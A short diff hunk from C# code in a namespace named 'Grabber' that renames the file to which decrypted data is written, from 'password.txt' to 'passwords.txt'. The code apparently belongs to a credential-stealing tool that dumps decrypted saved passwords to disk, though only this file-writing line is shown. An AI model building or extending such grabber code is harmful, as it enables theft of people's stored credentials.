@@ -139,7 +139,7 @@ namespace Grabber
                         }
                     }
 
-                    File.WriteAllLines(profile + "\\password.txt", decryptedData.ToArray());
+                    File.WriteAllLines(profile + "\\passwords.txt", decryptedData.ToArray());
 
                     conn.Close();
                 }
